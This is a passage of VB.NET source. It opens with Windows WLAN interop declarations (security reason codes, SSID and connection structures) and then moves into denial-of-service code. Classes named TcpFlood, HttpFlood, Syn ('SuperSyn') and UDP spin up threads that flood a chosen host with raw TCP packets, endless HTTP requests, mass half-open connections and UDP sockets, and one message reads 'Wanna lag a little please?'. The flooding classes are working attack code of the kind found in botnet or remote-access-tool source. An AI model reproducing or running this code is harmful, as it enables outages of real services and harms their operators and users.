            MSMSEC_TRANSITION_NETWORK = (MSMSEC_BASE + 28)
            ' Key contains characters which do not map to ASCII
            MSMSEC_PROFILE_KEY_UNMAPPED_CHAR = (MSMSEC_BASE + 29)
            ' Capability matching failed at profile (auth not found)
            MSMSEC_CAPABILITY_PROFILE_AUTH = (MSMSEC_BASE + 30)
            ' Capability matching failed at profile (cipher not found)
            MSMSEC_CAPABILITY_PROFILE_CIPHER = (MSMSEC_BASE + 31)

            ' Failed to queue UI request
            MSMSEC_UI_REQUEST_FAILURE = (MSMSEC_CONNECT_BASE + 1)
            ' 802.1x authentication did not start within configured time 
            MSMSEC_AUTH_START_TIMEOUT = (MSMSEC_CONNECT_BASE + 2)
            ' 802.1x authentication did not complete within configured time
            MSMSEC_AUTH_SUCCESS_TIMEOUT = (MSMSEC_CONNECT_BASE + 3)
            ' Dynamic key exchange did not start within configured time
            MSMSEC_KEY_START_TIMEOUT = (MSMSEC_CONNECT_BASE + 4)
            ' Dynamic key exchange did not succeed within configured time
            MSMSEC_KEY_SUCCESS_TIMEOUT = (MSMSEC_CONNECT_BASE + 5)
            ' Message 3 of 4 way handshake has no key data (RSN/WPA)
            MSMSEC_M3_MISSING_KEY_DATA = (MSMSEC_CONNECT_BASE + 6)
            ' Message 3 of 4 way handshake has no IE (RSN/WPA)
            MSMSEC_M3_MISSING_IE = (MSMSEC_CONNECT_BASE + 7)
            ' Message 3 of 4 way handshake has no Group Key (RSN)
            MSMSEC_M3_MISSING_GRP_KEY = (MSMSEC_CONNECT_BASE + 8)
            ' Matching security capabilities of IE in M3 failed (RSN/WPA)
            MSMSEC_PR_IE_MATCHING = (MSMSEC_CONNECT_BASE + 9)
            ' Matching security capabilities of Secondary IE in M3 failed (RSN)
            MSMSEC_SEC_IE_MATCHING = (MSMSEC_CONNECT_BASE + 10)
            ' Required a pairwise key but AP configured only group keys
            MSMSEC_NO_PAIRWISE_KEY = (MSMSEC_CONNECT_BASE + 11)
            ' Message 1 of group key handshake has no key data (RSN/WPA)
            MSMSEC_G1_MISSING_KEY_DATA = (MSMSEC_CONNECT_BASE + 12)
            ' Message 1 of group key handshake has no group key
            MSMSEC_G1_MISSING_GRP_KEY = (MSMSEC_CONNECT_BASE + 13)
            ' AP reset secure bit after connection was secured
            MSMSEC_PEER_INDICATED_INSECURE = (MSMSEC_CONNECT_BASE + 14)
            ' 802.1x indicated there is no authenticator but profile requires 802.1x
            MSMSEC_NO_AUTHENTICATOR = (MSMSEC_CONNECT_BASE + 15)
            ' Plumbing settings to NIC failed
            MSMSEC_NIC_FAILURE = (MSMSEC_CONNECT_BASE + 16)
            ' Operation was cancelled by caller
            MSMSEC_CANCELLED = (MSMSEC_CONNECT_BASE + 17)
            ' Key was in incorrect format 
            MSMSEC_KEY_FORMAT = (MSMSEC_CONNECT_BASE + 18)
            ' Security downgrade detected
            MSMSEC_DOWNGRADE_DETECTED = (MSMSEC_CONNECT_BASE + 19)
            ' PSK mismatch suspected
            MSMSEC_PSK_MISMATCH_SUSPECTED = (MSMSEC_CONNECT_BASE + 20)
            ' Forced failure because connection method was not secure
            MSMSEC_FORCED_FAILURE = (MSMSEC_CONNECT_BASE + 21)
            ' ui request couldn't be queued or user pressed cancel
            MSMSEC_SECURITY_UI_FAILURE = (MSMSEC_CONNECT_BASE + 22)

            MSMSEC_MAX = MSMSEC_END
        End Enum

        ''' <summary>
        ''' Contains information about connection related notifications.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_CONNECTION_NOTIFICATION_DATA</c> type.
        ''' </remarks>
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
        Public Structure WlanConnectionNotificationData
            ''' <remarks>
            ''' On Windows XP SP 2, only <see cref="WlanConnectionMode.Profile"/> is supported.
            ''' </remarks>
            Public wlanConnectionMode As WlanConnectionMode
            ''' <summary>
            ''' The name of the profile used for the connection. Profile names are case-sensitive.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=32)> _
            Public profileName As String
            ''' <summary>
            ''' The SSID of the association.
            ''' </summary>
            Public dot11Ssid As Dot11Ssid
            ''' <summary>
            ''' The BSS network type.
            ''' </summary>
            Public dot11BssType As Dot11BssType
            ''' <summary>
            ''' Indicates whether security is enabled for this connection.
            ''' </summary>
            Public securityEnabled As Boolean
            ''' <summary>
            ''' Indicates the reason for an operation failure.
            ''' This field has a value of <see cref="WlanReasonCode.Success"/> for all connection-related notifications except <see cref="WlanNotificationCodeAcm.ConnectionComplete"/>.
            ''' If the connection fails, this field indicates the reason for the failure.
            ''' </summary>
            Public wlanReasonCode As WlanReasonCode
            ''' <summary>
            ''' This field contains the XML presentation of the profile used for discovery, if the connection succeeds.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=1)> _
            Public profileXml As String
        End Structure

        ''' <summary>
        ''' Indicates the state of an interface.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_INTERFACE_STATE</c> type.
        ''' </remarks>
        Public Enum WlanInterfaceState
            ''' <summary>
            ''' The interface is not ready to operate.
            ''' </summary>
            NotReady = 0
            ''' <summary>
            ''' The interface is connected to a network.
            ''' </summary>
            Connected = 1
            ''' <summary>
            ''' The interface is the first node in an ad hoc network. No peer has connected.
            ''' </summary>
            AdHocNetworkFormed = 2
            ''' <summary>
            ''' The interface is disconnecting from the current network.
            ''' </summary>
            Disconnecting = 3
            ''' <summary>
            ''' The interface is not connected to any network.
            ''' </summary>
            Disconnected = 4
            ''' <summary>
            ''' The interface is attempting to associate with a network.
            ''' </summary>
            Associating = 5
            ''' <summary>
            ''' Auto configuration is discovering the settings for the network.
            ''' </summary>
            Discovering = 6
            ''' <summary>
            ''' The interface is in the process of authenticating.
            ''' </summary>
            Authenticating = 7
        End Enum

        ''' <summary>
        ''' Contains the SSID of an interface.
        ''' </summary>
        Public Structure Dot11Ssid
            ''' <summary>
            ''' The length, in bytes, of the <see cref="SSID"/> array.
            ''' </summary>
            Public SSIDLength As UInteger
            ''' <summary>
            ''' The SSID.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=32)> _
            Public SSID As Byte()
        End Structure

        ''' <summary>
        ''' Defines an 802.11 PHY and media type.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>DOT11_PHY_TYPE</c> type.
        ''' </remarks>
        Public Enum Dot11PhyType As UInteger
            ''' <summary>
            ''' Specifies an unknown or uninitialized PHY type.
            ''' </summary>
            Unknown = 0
            ''' <summary>
            ''' Specifies any PHY type.
            ''' </summary>
            Any = Unknown
            ''' <summary>
            ''' Specifies a frequency-hopping spread-spectrum (FHSS) PHY. Bluetooth devices can use FHSS or an adaptation of FHSS.
            ''' </summary>
            FHSS = 1
            ''' <summary>
            ''' Specifies a direct sequence spread spectrum (DSSS) PHY.
            ''' </summary>
            DSSS = 2
            ''' <summary>
            ''' Specifies an infrared (IR) baseband PHY.
            ''' </summary>
            IrBaseband = 3
            ''' <summary>
            ''' Specifies an orthogonal frequency division multiplexing (OFDM) PHY. 802.11a devices can use OFDM.
            ''' </summary>
            OFDM = 4
            ''' <summary>
            ''' Specifies a high-rate DSSS (HRDSSS) PHY.
            ''' </summary>
            HRDSSS = 5
            ''' <summary>
            ''' Specifies an extended rate PHY (ERP). 802.11g devices can use ERP.
            ''' </summary>
            ERP = 6
            ''' <summary>
            ''' Specifies the start of the range that is used to define PHY types that are developed by an independent hardware vendor (IHV).
            ''' </summary>
            IHV_Start = &H80000000UI
            ''' <summary>
            ''' Specifies the end of the range that is used to define PHY types that are developed by an independent hardware vendor (IHV).
            ''' </summary>
            IHV_End = &HFFFFFFFFUI
        End Enum


        Public Enum Dot11BssType

            Infrastructure = 1

            Independent = 2

            Any = 3
        End Enum

        <StructLayout(LayoutKind.Sequential)> _
        Public Structure WlanAssociationAttributes

            Public dot11Ssid As Dot11Ssid

            Public dot11BssType As Dot11BssType

            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=6)> _
            Public m_dot11Bssid As Byte()

            Public dot11PhyType As Dot11PhyType

            Public dot11PhyIndex As UInteger

            Public wlanSignalQuality As UInteger

            Public rxRate As UInteger

            Public txRate As UInteger

            Public ReadOnly Property Dot11Bssid() As PhysicalAddress
                Get
                    Return New PhysicalAddress(m_dot11Bssid)
                End Get
            End Property
        End Structure

        Public Enum WlanConnectionMode

            Profile = 0

            TemporaryProfile

            DiscoverySecure

            DiscoveryUnsecure

            Auto

            Invalid
        End Enum

        Public Enum Dot11AuthAlgorithm As UInteger

            IEEE80211_Open = 1

            IEEE80211_SharedKey = 2

            WPA = 3

            WPA_PSK = 4

            WPA_None = 5

            RSNA = 6

            RSNA_PSK = 7

            IHV_Start = &H80000000UI

            IHV_End = &HFFFFFFFFUI
        End Enum


        Public Enum Dot11CipherAlgorithm As UInteger

            None = &H0

            WEP40 = &H1

            TKIP = &H2

            CCMP = &H4

            WEP104 = &H5

            WPA_UseGroup = &H100
            ''' <summary>
            ''' Specifies a Wifi Protected Access (WPA) Use Group Key cipher suite. For more information about the Use Group Key cipher suite, refer to Clause 7.3.2.9.1 of the IEEE 802.11i-2004 standard.
            ''' </summary>
            RSN_UseGroup = &H100
            ''' <summary>
            ''' Specifies a WEP cipher algorithm with a cipher key of any length.
            ''' </summary>
            WEP = &H101
            ''' <summary>
            ''' Specifies the start of the range that is used to define proprietary cipher algorithms that are developed by an independent hardware vendor (IHV).
            ''' </summary>
            IHV_Start = &H80000000UI
            ''' <summary>
            ''' Specifies the end of the range that is used to define proprietary cipher algorithms that are developed by an IHV.
            ''' </summary>
            IHV_End = &HFFFFFFFFUI
        End Enum


        <StructLayout(LayoutKind.Sequential)> _
        Public Structure WlanSecurityAttributes
            ''' <summary>
            ''' Indicates whether security is enabled for this connection.
            ''' </summary>
            <MarshalAs(UnmanagedType.Bool)> _
            Public securityEnabled As Boolean
            <MarshalAs(UnmanagedType.Bool)> _
            Public oneXEnabled As Boolean
            ''' <summary>
            ''' The authentication algorithm.
            ''' </summary>
            Public dot11AuthAlgorithm As Dot11AuthAlgorithm
            ''' <summary>
            ''' The cipher algorithm.
            ''' </summary>
            Public dot11CipherAlgorithm As Dot11CipherAlgorithm
        End Structure

        ''' <summary>
        ''' Defines the attributes of a wireless connection.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_CONNECTION_ATTRIBUTES</c> type.
        ''' </remarks>
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
        Public Structure WlanConnectionAttributes
            ''' <summary>
            ''' The state of the interface.
            ''' </summary>
            Public isState As WlanInterfaceState
            ''' <summary>
            ''' The mode of the connection.
            ''' </summary>
            Public wlanConnectionMode As WlanConnectionMode
            ''' <summary>
            ''' The name of the profile used for the connection. Profile names are case-sensitive.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=256)> _
            Public profileName As String
            ''' <summary>
            ''' The attributes of the association.
            ''' </summary>
            Public wlanAssociationAttributes As WlanAssociationAttributes
            ''' <summary>
            ''' The security attributes of the connection.
            ''' </summary>
            Public wlanSecurityAttributes As WlanSecurityAttributes
        End Structure

        ''' <summary>
        ''' Contains information about a LAN interface.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
        Public Structure WlanInterfaceInfo
            ''' <summary>
            ''' The GUID of the interface.
            ''' </summary>
            Public interfaceGuid As Guid
            ''' <summary>
            ''' The description of the interface.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=256)> _
            Public interfaceDescription As String
            ''' <summary>
            ''' The current state of the interface.
            ''' </summary>
            Public isState As WlanInterfaceState
        End Structure

        ''' <summary>
        ''' The header of the list returned by <see cref="WlanEnumInterfaces"/>.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential)> _
        Friend Structure WlanInterfaceInfoListHeader
            Public numberOfItems As UInteger
            Public index As UInteger
        End Structure

        ''' <summary>
        ''' The header of the list returned by <see cref="WlanGetProfileList"/>.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential)> _
        Friend Structure WlanProfileInfoListHeader
            Public numberOfItems As UInteger
            Public index As UInteger
        End Structure

        ''' <summary>
        ''' Contains basic information about a profile.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
        Public Structure WlanProfileInfo
            ''' <summary>
            ''' The name of the profile. This value may be the name of a domain if the profile is for provisioning. Profile names are case-sensitive.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=256)> _
            Public profileName As String
            ''' <summary>
            ''' Profile flags.
            ''' </summary>
            Public profileFlags As WlanProfileFlags
        End Structure

        ''' <summary>
        ''' Flags that specifiy the miniport driver's current operation mode.
        ''' </summary>
        <Flags()> _
        Public Enum Dot11OperationMode As UInteger
            Unknown = &H0
            Station = &H1
            AP = &H2
            ''' <summary>
            ''' Specifies that the miniport driver supports the Extensible Station (ExtSTA) operation mode.
            ''' </summary>
            ExtensibleStation = &H4
            ''' <summary>
            ''' Specifies that the miniport driver supports the Network Monitor (NetMon) operation mode.
            ''' </summary>
            NetworkMonitor = &H80000000UI
        End Enum
#End Region
        <DebuggerStepThrough()> _
        Friend Shared Sub ThrowIfError(ByVal win32ErrorCode As Integer)
            If win32ErrorCode <> 0 Then
                Throw New Win32Exception(win32ErrorCode)
            End If
        End Sub
    End Class
End Namespace
Public Class TcpController
    Public Shared isFlooding As Boolean = False

    Shared targetList As New List(Of TcpCrusher)()

    Private Function ParseHost(ByVal host As String) As String
        Dim addresslist As IPAddress() = Dns.GetHostAddresses(host)
        Dim parsedIP As String = ""

        For Each theaddress As IPAddress In addresslist
            parsedIP = theaddress.ToString()
        Next

        Return parsedIP
    End Function

    Public Sub AddTarget(ByVal host As String, ByVal port As Integer, ByVal interval As Integer, ByVal usedThreads As Integer)
        Dim parsedHost As String = ParseHost(host)
        If [String].IsNullOrEmpty(parsedHost) Then
            Throw New HostNotFoundException("")
        End If

        Dim hostEP As New IPEndPoint(IPAddress.Parse(parsedHost), port)

        For i As Integer = 0 To usedThreads
            targetList.Add(New TcpCrusher(hostEP, interval))
        Next
    End Sub


    Public Sub Start()
        For Each flood As TcpCrusher In targetList
            flood.StartFlood()
        Next
    End Sub


    Public Shared Sub [Stop]()
        For Each flood As TcpCrusher In targetList
            flood.StopFlood()
        Next
        Clear()
    End Sub


    Public Shared Sub Clear()
        For Each flood As TcpCrusher In targetList
            flood.Abort()
        Next

        targetList.Clear()
    End Sub


    Public Class TcpCrusher
        Private t As Thread
        Private flood As TcpFlood

        Public Sub New(ByVal host As IPEndPoint, ByVal interval As Integer)
            flood = New TcpFlood(host, interval)
            t = New Thread(AddressOf flood.StartFlood)
            t.Start()
        End Sub

        Public Sub StartFlood()
            flood.IsFlooding = True
            isFlooding = True
            flood.StartFlood()
        End Sub

        Public Sub StopFlood()
            flood.StopFlood()
        End Sub

        Public Sub Abort()
            Try
                flood.StopFlood()
                flood.IsFlooding = False
                t.Abort()
            Catch
            End Try
        End Sub

        Public Class TcpFlood
            Private client As Socket
            Private _host As IPEndPoint = Nothing
            Private _interval As Integer

            Private _IsFlooding As Boolean
            Public Property IsFlooding() As Boolean
                Get
                    Return _IsFlooding
                End Get
                Set(ByVal value As Boolean)
                    _IsFlooding = value
                End Set
            End Property

            Public Sub New(ByVal host As IPEndPoint, ByVal interval As Integer)
                _host = host
                _interval = interval
                client = New Socket(_host.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
            End Sub

            Public Sub StartFlood()
                If Not client.Connected Then
                    client.Connect(_host)
                End If
                IsFlooding = True
                IsFlooding = True
                Flood()
            End Sub

            Public Sub StopFlood()
                If client.Connected Then
                    client.Close()
                End If
                IsFlooding = False
                IsFlooding = False
            End Sub

            Private Sub Flood()
                While IsFlooding
                    Dim packet As Byte() = New Byte(1469) {}
                    Try
                        client.SendTo(packet, _host)
                    Catch
                    Finally
                        Thread.Sleep(_interval)
                    End Try
                End While
            End Sub
        End Class
    End Class
End Class
Friend Class HttpFlood
    Private Shared _floodingJob As ThreadStart()
    Private Shared _floodingThread As Thread()
    Public Shared Host As String
    Public Shared Interval As Integer
    Public Shared IsEnabled As Boolean
    Private Shared _requestClass As HttpRequest()
    Public Shared Threads As Integer
    Public Shared Sub StartHttpFlood()
        _floodingThread = New Thread(Threads - 1) {}
        _floodingJob = New ThreadStart(Threads - 1) {}
        _requestClass = New HttpRequest(Threads - 1) {}
        For i As Integer = 0 To Threads - 1
            _requestClass(i) = New HttpRequest(Host, Interval)
            _floodingJob(i) = New ThreadStart(AddressOf _requestClass(i).Send)
            _floodingThread(i) = New Thread(_floodingJob(i))
            _floodingThread(i).Start()
        Next
        IsEnabled = True
    End Sub
    Public Shared Sub StopHttpFlood()
        For i As Integer = 0 To Threads - 1
            Try
                _floodingThread(i).Abort()
                _floodingThread(i) = Nothing
                _floodingJob(i) = Nothing
                _requestClass(i) = Nothing
            Catch p As Exception
            End Try
        Next
        IsEnabled = False
    End Sub
    Private Class HttpRequest
        Private Host As String
        Private Http As New WebClient()
        Private Interval As Integer

        Public Sub New(ByVal Host As String, ByVal Interval As Integer)
            Me.Host = Host
            Me.Interval = Interval
        End Sub

        Public Sub Send()
            While True
                Try
                    Http.DownloadString(Host)
                    Thread.Sleep(Interval)
                Catch
                    Thread.Sleep(Interval)
                End Try
            End While
        End Sub
    End Class
End Class
Friend Class Syn
    Private Shared _floodingJob As ThreadStart()
    Private Shared _floodingThread As Thread()
    Private Shared _ipEo As IPEndPoint
    Private Shared _synClass As SendSyn()
    Public Shared Host As String
    Public Shared IsEnabled As Boolean
    Public Shared Port As Integer = 80
    Public Shared SuperSynSockets As Integer = 200
    Public Shared Threads As Integer = 5

    Public Shared Sub StartSuperSyn()
        Try
            Dim addressList As IPAddress() = Dns.GetHostEntry(Host).AddressList
            _ipEo = New IPEndPoint(addressList(0), Port)
        Catch
            Dim address As IPAddress = IPAddress.Parse(Host)
            _ipEo = New IPEndPoint(address, Port)
        End Try
        _floodingThread = New Thread(Threads - 1) {}
        _floodingJob = New ThreadStart(Threads - 1) {}
        _synClass = New SendSyn(Threads - 1) {}
        For i As Integer = 0 To Threads - 1
            _synClass(i) = New SendSyn(_ipEo, SuperSynSockets)
            _floodingJob(i) = New ThreadStart(AddressOf _synClass(i).Send)
            _floodingThread(i) = New Thread(_floodingJob(i))
            _floodingThread(i).Start()
        Next
        IsEnabled = True
    End Sub

    Public Shared Sub StopSuperSyn()
        For i As Integer = 0 To Threads - 1
            Try
                _floodingThread(i).Abort()
                _floodingThread(i) = Nothing
                _floodingJob(i) = Nothing
                _synClass(i) = Nothing
            Catch
            End Try
        Next
        IsEnabled = False
    End Sub


    Private Class SendSyn
        Private _sock As Socket()
        Private ipEo As IPEndPoint
        Private SuperSynSockets As Integer

        Public Sub New(ByVal ipEo As IPEndPoint, ByVal superSynSockets__1 As Integer)
            Me.ipEo = ipEo
            SuperSynSockets = superSynSockets__1
        End Sub

        Private Shared Sub OnConnect(ByVal ar As IAsyncResult)
        End Sub

        Public Sub Send()
            While True
                Dim num As Integer
                Try
                    _sock = New Socket(SuperSynSockets - 1) {}
                    For num = 0 To SuperSynSockets - 1
                        _sock(num) = New Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
                        _sock(num).Blocking = False
                        _sock(num).BeginConnect(ipEo, New System.AsyncCallback(AddressOf OnConnect), _sock(num))
                    Next
                    Thread.Sleep(100)
                    For num = 0 To SuperSynSockets - 1
                        If _sock(num).Connected Then
                            _sock(num).Disconnect(False)
                        End If
                        _sock(num).Close()
                        _sock(num) = Nothing
                    Next
                    _sock = Nothing
                Catch
                    For num = 0 To SuperSynSockets - 1
                        Try
                            If _sock IsNot Nothing Then
                                If _sock(num).Connected Then
                                    _sock(num).Disconnect(False)
                                End If
                                _sock(num).Close()
                                _sock(num) = Nothing
                            End If
                        Catch
                        End Try
                    Next
                End Try
            End While
        End Sub
    End Class

End Class
Friend Class UDP
    Private Shared _floodingJob As ThreadStart()
    Private Shared _floodingThread As Thread()
    Private Shared _ipEo As IPEndPoint
    Private Shared _UdPcLass As SenduDp()
    Public Shared Host As String
    Public Shared IsEnabled As Boolean
    Public Shared Port As Integer
    Public Shared UDPzSockets As Integer
    Public Shared Threads As Integer

    Public Shared Sub StartUDPz()
        Try
            Dim addressList As IPAddress() = Dns.GetHostEntry(Host).AddressList
            _ipEo = New IPEndPoint(addressList(0), Port)
        Catch
            Dim address As IPAddress = IPAddress.Parse(Host)
            _ipEo = New IPEndPoint(address, Port)
        End Try
        _floodingThread = New Thread(Threads - 1) {}
        _floodingJob = New ThreadStart(Threads - 1) {}
        _UdPcLass = New SenduDp(Threads - 1) {}
        For i As Integer = 0 To Threads - 1
            _UdPcLass(i) = New SenduDp(_ipEo, UDPzSockets)
            _floodingJob(i) = New ThreadStart(AddressOf _UdPcLass(i).Send)
            _floodingThread(i) = New Thread(_floodingJob(i))
            _floodingThread(i).Start()
        Next
        IsEnabled = True
    End Sub

    Public Shared Sub StopUDPz()
        For i As Integer = 0 To Threads - 1
            Try
                _floodingThread(i).Abort()
                _floodingThread(i) = Nothing
                _floodingJob(i) = Nothing
                _UdPcLass(i) = Nothing
            Catch
            End Try
        Next
        IsEnabled = False
    End Sub


    Private Class SenduDp
        Private _sock As Socket()
        Private ipEo As IPEndPoint
        Private UDPzSockets As Integer

        Public Sub New(ByVal ipEo As IPEndPoint, ByVal UDPzSockets__1 As Integer)
            Me.ipEo = ipEo
            UDPzSockets = UDPzSockets__1
        End Sub

        Private Shared Sub OnConnect(ByVal ar As IAsyncResult)
        End Sub

        Public Sub Send()
            While True
                Dim num As Integer
                Try
                    _sock = New Socket(UDPzSockets - 1) {}
                    For num = 0 To UDPzSockets - 1
                        _sock(num) = New Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Udp)
                        _sock(num).Blocking = False
                        _sock(num).BeginConnect(ipEo, New System.AsyncCallback(AddressOf OnConnect), _sock(num))
                    Next
                    Thread.Sleep(100)
                    For num = 0 To UDPzSockets - 1
                        If _sock(num).Connected Then
                            _sock(num).Disconnect(False)
                        End If
                        _sock(num).Close()
                        _sock(num) = Nothing
                    Next
                    _sock = Nothing
                Catch
                    For num = 0 To UDPzSockets - 1
                        Try
                            If _sock IsNot Nothing Then
                                If _sock(num).Connected Then
                                    Dim msg As Byte() = Encoding.UTF8.GetBytes("Hello server! Wanna lag a little please? By-AbsoluteEye")
                                    Dim bytes As Byte() = New Byte(255) {}
                                    _sock(num).Send(msg, 0, msg.Length, SocketFlags.None)
                                    _sock(num).Disconnect(False)
                                End If
                                _sock(num).Close()
                                _sock(num) = Nothing
                            End If
                        Catch
                        End Try
                    Next
                End Try
            End While
        End Sub
    End Class

End Class
<Serializable()> _
Public Class HostNotFoundException
    Inherits Exception
    Public Sub New()
    End Sub
    Public Sub New(ByVal message As String)
        MyBase.New(message)
    End Sub
    Public Sub New(ByVal message As String, ByVal inner As Exception)
        MyBase.New(message, inner)
    End Sub
    Protected Sub New(ByVal info As System.Runtime.Serialization.SerializationInfo, ByVal context As System.Runtime.Serialization.StreamingContext)
        MyBase.New(info, context)
    End Sub
End Class